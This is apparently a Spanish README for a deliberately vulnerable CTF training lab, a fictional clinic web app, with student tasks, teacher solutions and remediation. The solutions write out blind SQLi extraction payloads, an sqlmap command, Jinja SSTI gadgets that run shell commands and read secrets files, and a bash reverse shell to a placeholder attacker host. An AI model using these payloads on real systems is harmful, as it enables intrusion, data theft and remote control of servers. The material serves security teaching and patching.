# Clínica Aurora Salud — Laboratorio de seguridad (Fases 1 a 4)

Aplicación web **deliberadamente vulnerable** para un ejercicio de formación
en seguridad ofensiva/defensiva (estilo CTF). Reproduce el escenario de una
clínica ficticia y cubre, por ahora, las cuatro primeras fases del proyecto:

- **Fase 1 — Reconocimiento / OSINT:** la web pública expone al personal de la
  clínica. En la sección *Plantilla* y en *Noticias* aparece la
  **Dra. Anna Kournikova**, de la que el alumno deduce un posible nombre de
  usuario (`akournikova`).
- **Fase 2 — SQL Injection (ciega):** el filtro de categorías de `/servicios`
  es vulnerable a **Blind SQLi basada en booleano**. La página no devuelve los
  datos: solo refleja un banner *sí/no* según si la condición inyectada es
  verdadera o falsa. El alumno usa ese oráculo para extraer, carácter a
  carácter, la contraseña de la Dra. Kournikova desde la tabla `users`.
- **Fase 3 — Movimiento lateral (IDOR):** con esas credenciales el alumno entra
  en el **portal de empleados** (`/portal`) y descubre **AuroraBot**. Las
  conversaciones se abren por su `id` en la URL (`/portal/chatbot/<id>`) **sin
  comprobar el propietario** (IDOR / Broken Access Control). Manipulando el
  identificador, el alumno accede a la **conversación 67**, del Administrador de
  Sistemas, que contiene su contraseña → obtiene la cuenta `sysadmin`.
- **Fase 4 — Ejecución de código (RCE):** con la cuenta `sysadmin` se accede al
  **panel de administración** (`/admin`) y a su gestor de plantillas de informe.
  La subida **no valida extensión ni tipo**, y la vista previa **renderiza la
  plantilla con Jinja** → **SSTI (Server-Side Template Injection)**. Subiendo
  una plantilla maliciosa el alumno ejecuta comandos en el servidor (webshell) y
  puede lanzar una **reverse shell**, obteniendo una consola como `www-data`.

> ⚠️ **Aviso.** Contiene vulnerabilidades a propósito y credenciales en texto
> plano. Ejecutar **solo en un laboratorio aislado**, nunca en Internet ni en
> redes de producción. Clínica, personas y datos son **ficticios**.

---

## Stack

- Python 3.12 + Flask
- SQLite (fichero `clinica.db` generado desde `schema.sql`)

## Estructura

```
clinica_lab/
├── app.py               # Aplicación Flask (contiene el punto vulnerable)
├── schema.sql           # Esquema + datos sembrados (users, servicios)
├── init_db.py           # Genera clinica.db a partir de schema.sql
├── requirements.txt
├── Dockerfile
├── docker-compose.yml
├── templates/           # Inicio, Sobre nosotros, Noticias, Plantilla, Servicios
└── static/css/styles.css
```

---

## Cómo levantarlo

### Opción A — Docker (recomendada para repartir a alumnos)

```bash
docker compose up --build
```

Accede a **http://localhost:5000**. La base de datos se inicializa sola durante
el `build`.

### Opción B — Local con Python

```bash
cd clinica_lab
python3 -m venv .venv
source .venv/bin/activate        # En Windows: .venv\Scripts\activate
pip install -r requirements.txt
python init_db.py                # Crea clinica.db
python app.py
```

Accede a **http://localhost:5000**.

---

## Guía del ALUMNO (enunciado)

1. **Fase 1 — OSINT.** Explora la web pública (*Sobre nosotros*, *Noticias*,
   *Plantilla*). Identifica a un profesional de la clínica y deduce su posible
   nombre de usuario.
2. **Fase 2 — SQLi ciega.** Ve a **Servicios** y usa el filtro por categoría.
   Intercepta la petición con Burp Suite y estudia el parámetro `categoria`.
   La página no te devuelve datos, solo un banner *sí/no*: es una inyección
   **ciega basada en booleano**.
   1. Confirma la inyección con una condición siempre verdadera y otra falsa, y
      comprueba que el banner cambia.
   2. Usa ese oráculo para averiguar la longitud de la contraseña de
      `akournikova` y luego extráela carácter a carácter (automatízalo con Burp
      Intruder o `sqlmap`).
   3. Localiza la credencial de la Dra. Kournikova (la usarás en la Fase 3).
3. **Fase 3 — Movimiento lateral (IDOR).** Entra en **Área de empleados**
   (`/portal`) con las credenciales de la Dra. Kournikova. Abre **AuroraBot** y
   sus conversaciones. Fíjate en el `id` de la conversación en la URL
   (`/portal/chatbot/<id>`) e intercéptalo con Burp. Enumera/manipula ese `id`
   para acceder a conversaciones que no son tuyas hasta dar con la del
   Administrador de Sistemas. Consigue sus credenciales (usuario `sysadmin`)
   para la siguiente fase.
4. **Fase 4 — Ejecución de código (RCE).** Inicia sesión en `/portal` como
   `sysadmin` y entra en **Administración** (`/admin`). El gestor dice admitir
   *solo .txt*: estudia el filtro e intenta **saltártelo** para subir código.
   Luego previsualiza el archivo subido y observa cómo se renderiza: comprueba
   si es vulnerable a **SSTI** y, si lo es, úsalo para ejecutar comandos en el
   servidor y conseguir una **reverse shell**.

---

## Guía del PROFESOR (solución) 🔑

<details>
<summary>Desplegar solución de la Fase 2 (Blind SQLi booleana)</summary>

El parámetro vulnerable es `categoria` en `GET /servicios`. Internamente se
ejecuta una **consulta de comprobación** por concatenación:

```sql
SELECT id FROM servicios WHERE categoria = '<ENTRADA>'
```

La página **no imprime** el resultado de esa consulta. Solo refleja un booleano:

- con resultado → banner **«Sí ofrecemos servicios en …»**  (condición TRUE)
- sin resultado → banner **«Actualmente no ofrecemos …»**   (condición FALSE)

Los errores SQL se silencian, así que no hay pistas verbosas: es una inyección
**ciega**. El truco de concatenación cierra la comilla de entrada y la comilla
final que añade la app empareja con la del payload (no hace falta `--`, aunque
también funciona).

**1) Confirmar la inyección (oráculo TRUE / FALSE):**

```
/servicios?categoria=Cardiología' AND '1'='1      -> banner "Sí ofrecemos"  (TRUE)
/servicios?categoria=Cardiología' AND '1'='2      -> banner "No ofrecemos"  (FALSE)
```

**2) Longitud de la contraseña de `akournikova` (resulta 13):**

```
/servicios?categoria=Cardiología' AND (SELECT LENGTH(password) FROM users WHERE username='akournikova')=13-- 
```

(banner TRUE cuando el número acierta la longitud; se busca por fuerza/binaria)

**3) Extracción carácter a carácter** (SQLite `SUBSTR`):

```
/servicios?categoria=Cardiología' AND SUBSTR((SELECT password FROM users WHERE username='akournikova'),1,1)='W'
/servicios?categoria=Cardiología' AND SUBSTR((SELECT password FROM users WHERE username='akournikova'),2,1)='1'
...
```

Cada posición que devuelve banner TRUE confirma el carácter. Repitiendo hasta la
longitud 13 se reconstruye **`W1mbl3don_97!`**.

**Automatización recomendada:**

- **Burp Intruder:** marca el carácter a probar como posición y usa el banner
  (o la longitud de respuesta) como criterio de distinción TRUE/FALSE.
- **sqlmap:**
  ```
  sqlmap -u "http://<IP>:5000/servicios?categoria=Cardiología" \
         -p categoria --technique=B --string="Sí ofrecemos" \
         -D main -T users -C username,password --dump
  ```

Credencial objetivo de esta fase: **`akournikova` / `W1mbl3don_97!`**.
(La cuenta `sysadmin` también está en `users`, pero es el objetivo de la Fase 3.)

</details>

<details>
<summary>Desplegar solución de la Fase 3 (IDOR)</summary>

**Acceso al portal.** En `/portal/login`, con `akournikova` / `W1mbl3don_97!`.

**El IDOR.** En `/portal/chatbot` el alumno ve solo sus conversaciones, por
ejemplo `#12` y `#13`. Al abrir una, la URL revela el identificador:

```
GET /portal/chatbot/12
```

La aplicación carga la conversación **solo por su `id`, sin comprobar el
propietario**. Cambiando el número (fuzzing/enumeración con Burp Intruder), el
alumno accede a conversaciones ajenas. La del Administrador de Sistemas es la
**67**:

```
GET /portal/chatbot/67
```

En esa conversación el `sysadmin` escribió sus credenciales:

```
Usuario: ... usuario sysadmin / contraseña S3rv3r_Aur0ra#2024!
```

Credencial objetivo de esta fase: **`sysadmin` / `S3rv3r_Aur0ra#2024!`**.

> Nota: AuroraBot es un chatbot **simulado** (reglas en `responder_bot()` de
> `app.py`), para que el laboratorio sea autocontenido y reproducible sin claves
> ni red. El vector de la fase es el **IDOR**, no el propio bot.

</details>

<details>
<summary>Desplegar solución de la Fase 4 (SSTI → RCE → reverse shell)</summary>

**Acceso.** En `/portal/login` con `sysadmin` / `S3rv3r_Aur0ra#2024!`; luego
**Administración** (`/admin`). El panel aparece porque la cuenta tiene rol
*Administrador de Sistemas* (un empleado normal recibe 403).

**El fallo.** Son dos fallos encadenados:

1. **Validación de extensión defectuosa** en `/admin/subir`. El panel dice
   admitir *solo .txt*, pero comprueba si el nombre **contiene** `.txt` en vez
   de verificar la extensión **real** (la última). Así, un `informe.txt.php`
   supera el filtro (bypass por **doble extensión**), mientras que un `.php`
   "pelado" se rechaza.
2. La vista previa (`/admin/preview/<archivo>`) **renderiza el contenido con
   Jinja** (`render_template_string`) → **SSTI**: la plantilla subida se ejecuta
   en el servidor.

> En este laboratorio Flask, la ejecución ocurre en la **vista previa** (SSTI).
> En un despliegue PHP+Apache el `.txt.php` lo ejecutaría directamente el
> handler de PHP al solicitarlo: misma lección (filtro de extensión débil).

**0) Comprobar el filtro.** Sube `prueba.png` o `shell.php` → *"Formato no
permitido"*. Sube `informe.txt` → se acepta. El objetivo es colar código
pese al filtro.

**1) Confirmar SSTI.** Sube un archivo llamado **`prueba.txt.php`** cuyo
contenido sea:

```
Prueba: {{ 7*7 }}
```

Pasa el filtro (contiene `.txt`) y la vista previa muestra `Prueba: 49` → se
evalúa como plantilla.

**2) Ejecución de comandos (webshell).** Sube **`shell.txt.php`** con un
*gadget* de Jinja que llega a `os`:

```jinja
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

La vista previa devuelve la salida de `id` (en el contenedor, `www-data`). Otros
gadgets equivalentes: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`.

**3) Leer el botín directamente (Fase 5 asoma aquí).**

```jinja
{{ cycler.__init__.__globals__.os.popen('cat .env').read() }}
{{ cycler.__init__.__globals__.os.popen('cat backup_clientes_2024.csv').read() }}
```

**4) Reverse shell.** Levanta un listener en la máquina atacante
(`nc -lvnp 4444`) y sube una plantilla con:

```jinja
{{ cycler.__init__.__globals__.os.popen('setsid bash -c "bash -i >& /dev/tcp/IP_ATACANTE/4444 0>&1" &').read() }}
```

Al previsualizarla, el servidor conecta de vuelta y el alumno obtiene una shell
como `www-data` dentro del contenedor → punto de partida de la Fase 5.

> El panel es **real** (ejecuta de verdad). En el laboratorio de Claude solo se
> verificó con `id`; nunca se abrió una reverse shell saliente.

</details>

### Remediación (parcheo) — enfoque defensivo

**Fase 2 — SQL Injection (ciega).** La causa raíz es la **concatenación de
entrada de usuario en la consulta de comprobación**. Que la inyección sea
*ciega* (solo refleja un booleano) la hace más lenta de explotar, pero igual de
grave: con el oráculo se extrae cualquier dato. Se corrige con **consultas
parametrizadas** (prepared statements). En `app.py`, el bloque vulnerable:

```python
comprobacion = "SELECT id FROM servicios WHERE categoria = '" + categoria + "'"
```

se sustituye por:

```python
cur.execute("SELECT id FROM servicios WHERE categoria = ?", (categoria,))
```

Buenas prácticas adicionales:

- Validar/allow-list el valor de `categoria` contra las categorías conocidas
  (así una entrada que no sea una categoría real se rechaza de entrada).
- No exponer una respuesta observable distinta según el resultado si no es
  necesario; registrar los errores en el servidor con `debug=False`.
- Aplicar el **mínimo privilegio** a la cuenta de BD que usa la aplicación
  (solo lectura sobre `servicios`, sin acceso a `users`).
- Almacenar contraseñas **hasheadas** (bcrypt/argon2), nunca en texto plano.

Referencia OWASP: **A03:2021 – Injection**.

**Fase 3 — Movimiento lateral (IDOR).** La causa raíz es una **referencia
directa insegura a objetos**: la conversación se recupera por su `id` sin
verificar que pertenezca al usuario autenticado. En `app.py`, la consulta
vulnerable

```python
conn.execute("SELECT ... FROM conversaciones WHERE id = ?", (conv_id,))
```

debe comprobar el propietario:

```python
conv = conn.execute(
    "SELECT ... FROM conversaciones WHERE id = ? AND usuario = ?",
    (conv_id, user["username"]),
).fetchone()
if conv is None:
    abort(403)   # no existe o no es tuya
```

Buenas prácticas adicionales:

- Autorización a nivel de objeto en **todos** los endpoints que reciben un id.
- Usar identificadores **no predecibles** (UUID) en lugar de enteros
  secuenciales dificulta la enumeración (defensa en profundidad, no sustituye a
  la comprobación de propiedad).
- No exponer secretos en el chat; formación al personal y **rotación inmediata**
  de cualquier credencial expuesta.

Referencia OWASP: **A01:2021 – Broken Access Control** (IDOR).

**Fase 4 — Ejecución de código (SSTI → RCE).** Hay dos fallos encadenados:

- **Validación de extensión defectuosa:** se comprueba si el nombre *contiene*
  `.txt` en vez de verificar la extensión **real**, lo que permite el bypass
  por doble extensión (`informe.txt.php`). Hay que validar la ÚLTIMA extensión
  con una allow-list y no fiarse del nombre:

  ```python
  import os
  if os.path.splitext(nombre)[1].lower() != ".txt":   # solo la última extensión
      rechazar()
  ```

  Mejor aún: renombrar el archivo con un nombre propio, guardarlo fuera de la
  raíz web y servirlo siempre como descarga (`Content-Disposition: attachment`),
  sin interpretarlo.
- **SSTI:** renderizar contenido controlado por el usuario como plantilla. El
  arreglo es **no** usar `render_template_string` sobre datos subidos. En
  `app.py`, en lugar de:

  ```python
  render = render_template_string(contenido, **contexto)   # VULNERABLE
  ```

  tratar el contenido como **texto** (escapado), o renderizar solo plantillas
  de confianza, o usar un entorno aislado:

  ```python
  from markupsafe import escape
  render = escape(contenido)          # se muestra, no se ejecuta
  # o bien, si se necesita plantilla de usuario, Jinja en modo sandbox:
  # from jinja2.sandbox import SandboxedEnvironment
  ```

Buenas prácticas adicionales:

- Ejecutar la app como usuario **sin privilegios** y **contenerizada** (ya se
  hace: `www-data` en Docker) para limitar el impacto de una RCE.
- Restringir **conexiones salientes** del servidor (egress) para dificultar las
  reverse shells.
- Desplegar con `debug=False` y un WSGI de producción (gunicorn): el depurador
  de Werkzeug sería una **segunda** RCE no intencionada.

Referencias OWASP: **A03:2021 – Injection** (SSTI) y
**A08 / Unrestricted File Upload**.
